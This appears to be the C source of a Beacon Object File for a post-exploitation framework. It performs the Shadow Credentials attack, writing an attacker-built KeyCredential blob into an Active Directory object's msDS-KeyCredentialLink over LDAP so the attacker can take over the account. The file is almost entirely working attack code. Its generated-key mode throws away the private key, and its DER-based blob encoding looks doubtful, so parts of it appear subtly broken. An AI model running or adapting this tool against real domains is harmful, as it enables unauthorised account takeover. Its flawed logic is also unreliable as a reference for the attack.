/*
 * bof-shadowcred <target> [blob-hex|remove]
 *
 * Shadow Credentials: write msDS-KeyCredentialLink on a target AD object.
 *
 * With no blob argument an RSA-2048 key pair is generated with CNG and a
 * KeyCredential DER blob is built from the exported public key.  A prebuilt
 * blob (hex or base64) can be supplied instead.  `remove` clears the
 * attribute.
 *
 * The private key is not persisted by this BOF: capture the printed public
 * blob and pair it with a key you control (for example a PKINIT/UnPAC-the-
 * hash tool) when you need to authenticate.
 *
 * Requires write access to msDS-KeyCredentialLink (GenericWrite / GenericAll
 * or the "Key Credential Link" extended right).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "cryptoh.h"
#include "ldaphelpers.h"
#include "adsd.h"

static int der_len(unsigned char *out, int len)
{
    if (len < 0x80) {
        out[0] = (unsigned char)len;
        return 1;
    }
    if (len <= 0xff) {
        out[0] = 0x81; out[1] = (unsigned char)len;
        return 2;
    }
    out[0] = 0x82;
    out[1] = (unsigned char)(len >> 8);
    out[2] = (unsigned char)(len & 0xff);
    return 3;
}

static int der_tlv(unsigned char *out, unsigned char tag,
                   const unsigned char *val, int len)
{
    int n = der_len(out + 1, len);
    out[0] = tag;
    if (val && len) bof_memcpy(out + 1 + n, val, len);
    return 1 + n + len;
}

static int der_octet(unsigned char *out, const unsigned char *val, int len)
{
    return der_tlv(out, 0x04, val, len);
}

static int der_explicit(unsigned char *out, int tag,
                        const unsigned char *inner, int innerlen)
{
    return der_tlv(out, (unsigned char)(0xa0 | tag), inner, innerlen);
}

static int der_integer(unsigned char *out, unsigned int v)
{
    unsigned char b[5];
    int n = 0, i;
    if (v == 0) {
        b[0] = 0;
        n = 1;
    } else {
        while (v && n < 4) {
            b[n++] = (unsigned char)(v & 0xff);
            v >>= 8;
        }
        if (b[n - 1] & 0x80) b[n++] = 0;
        for (i = 0; i < n / 2; i++) {
            unsigned char t = b[i];
            b[i] = b[n - 1 - i];
            b[n - 1 - i] = t;
        }
    }
    return der_tlv(out, 0x02, b, n);
}

/* Build a KeyCredential blob from a BCRYPT_RSAKEY_BLOB. */
static int build_keycredential(const unsigned char *rsa, int rsalen,
                               const unsigned char keyid[16],
                               unsigned char *out, int outcap)
{
    unsigned char tmp[8192], km[8192], kmseq[8192];
    unsigned char kc[16384], final[16384];
    int kmlen = 0, kclen = 0, n, kmseqlen, finallen;

    n = der_octet(tmp, rsa, rsalen);
    kmlen += der_explicit(km + kmlen, 0, tmp, n);
    n = der_octet(tmp, keyid, 16);
    kmlen += der_explicit(km + kmlen, 1, tmp, n);
    kmseqlen = der_tlv(kmseq, 0x30, km, kmlen);

    n = der_integer(tmp, 0x200);
    kclen += der_explicit(kc + kclen, 0, tmp, n);
    n = der_octet(tmp, keyid, 16);
    kclen += der_explicit(kc + kclen, 1, tmp, n);
    n = der_integer(tmp, 1);            /* KeyUsage: NGC */
    kclen += der_explicit(kc + kclen, 2, tmp, n);
    n = der_integer(tmp, 0);            /* KeySource: AD */
    kclen += der_explicit(kc + kclen, 3, tmp, n);
    n = der_octet(tmp, kmseq, kmseqlen);/* KeyMaterial */
    kclen += der_explicit(kc + kclen, 4, tmp, n);

    finallen = der_tlv(final, 0x30, kc, kclen);
    if (finallen <= 0 || finallen > outcap) return -1;
    bof_memcpy(out, final, finallen);
    return finallen;
}

void go(char *args, int alen)
{
    datap parser;
    char *target, *blobarg = "";
    int tlen, blen;
    char base[512], dn[768], b64[16384];
    LDAP *ld;
    unsigned char *blob = NULL;
    unsigned int bloblen = 0;
    ULONG rc;
    int clear, generated = 0;

    BeaconDataParse(&parser, args, alen);
    target  = BeaconDataExtract(&parser, &tlen);
    blobarg = BeaconDataExtract(&parser, &blen);
    if (!target || !target[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: shadowcred <target> [blob-hex|blob-base64|remove]\n");
        return;
    }
    if (!blobarg) blobarg = "";
    clear = bof_stricmp(blobarg, "remove") == 0 ||
            bof_stricmp(blobarg, "clear") == 0;

    ld = bof_ldap_open();
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "LDAP connect/bind failed\n");
        return;
    }
    if (bof_ldap_default_nc(ld, base, sizeof(base)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "could not read defaultNamingContext\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }
    if (bof_ldap_resolve_dn(ld, base, target, dn, sizeof(dn)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "target not found: %s\n", target);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    if (clear) {
        rc = bof_ldap_delete_attr(ld, dn, "msDS-KeyCredentialLink");
        if (rc == LDAP_SUCCESS || rc == LDAP_NO_SUCH_ATTRIBUTE)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] KeyCredentialLink cleared on %s\n", dn);
        else
            BeaconPrintf(CALLBACK_ERROR, "clear failed: %lu (%s)\n",
                         (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
        WLDAP32$ldap_unbind(ld);
        return;
    }

    if (blobarg[0]) {
        unsigned int cap = (unsigned int)bof_strlen(blobarg) + 8;
        blob = (unsigned char *)KERNEL32$VirtualAlloc(NULL, cap,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!blob) goto done;
        if (bof_strncmp(blobarg, "0x", 2) == 0 ||
            (bof_strchr(blobarg, ':') && !bof_strchr(blobarg, '='))) {
            int n = bof_hex_decode(blobarg, blob, (int)cap);
            if (n <= 0) {
                BeaconPrintf(CALLBACK_ERROR, "invalid hex blob\n");
                goto done;
            }
            bloblen = (unsigned int)n;
        } else {
            int n = bof_b64_decode(blobarg, blob, (int)cap);
            if (n <= 0) {
                BeaconPrintf(CALLBACK_ERROR, "invalid base64 blob\n");
                goto done;
            }
            bloblen = (unsigned int)n;
        }
    } else {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        unsigned char rsapub[4096], keyid[16];
        ULONG rsalen = 0;
        NTSTATUS st;

        st = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM,
                                                NULL, 0);
        if (st < 0 || !hAlg) {
            BeaconPrintf(CALLBACK_ERROR, "BCryptOpenAlgorithmProvider(RSA) failed\n");
            goto done;
        }
        st = BCRYPT$BCryptGenerateKeyPair(hAlg, &hKey, 2048, 0);
        if (st >= 0) st = BCRYPT$BCryptFinalizeKeyPair(hKey, 0);
        if (st >= 0)
            st = BCRYPT$BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB,
                                        rsapub, sizeof(rsapub), &rsalen, 0);
        if (st < 0 || !rsalen) {
            BeaconPrintf(CALLBACK_ERROR, "RSA key generation/export failed: 0x%08lx\n",
                         (unsigned long)st);
            if (hKey) BCRYPT$BCryptDestroyKey(hKey);
            BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
            goto done;
        }
        if (BCRYPT$BCryptGenRandom(NULL, keyid, sizeof(keyid),
                                   BCRYPT_USE_SYSTEM_PREFERRED_RNG) < 0) {
            bof_memzero(keyid, sizeof(keyid));
            keyid[0] = 1;
        }
        blob = (unsigned char *)KERNEL32$VirtualAlloc(NULL, 8192,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (blob) {
            int n = build_keycredential(rsapub, (int)rsalen, keyid,
                                        blob, 8192);
            if (n > 0) {
                bloblen = (unsigned int)n;
                generated = 1;
            }
        }
        BCRYPT$BCryptDestroyKey(hKey);
        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    }

    if (!blob || bloblen < 8) {
        BeaconPrintf(CALLBACK_ERROR, "could not build KeyCredential blob\n");
        goto done;
    }

    bof_b64_encode(blob, (int)bloblen, b64, sizeof(b64));
    BeaconPrintf(CALLBACK_OUTPUT, "[*] target : %s\n", dn);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] blob   : %u bytes%s\n", bloblen,
                 generated ? " (generated RSA-2048)" : "");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] base64 : %s\n", b64);

    rc = bof_ldap_write_bin(ld, dn, "msDS-KeyCredentialLink", blob, bloblen);
    if (rc == LDAP_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] msDS-KeyCredentialLink written\n");
    else
        BeaconPrintf(CALLBACK_ERROR, "ldap modify failed: %lu (%s)\n",
                     (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));

done:
    if (blob) {
        bof_memzero(blob, bloblen);
        KERNEL32$VirtualFree(blob, 0, MEM_RELEASE);
    }
    WLDAP32$ldap_unbind(ld);
}
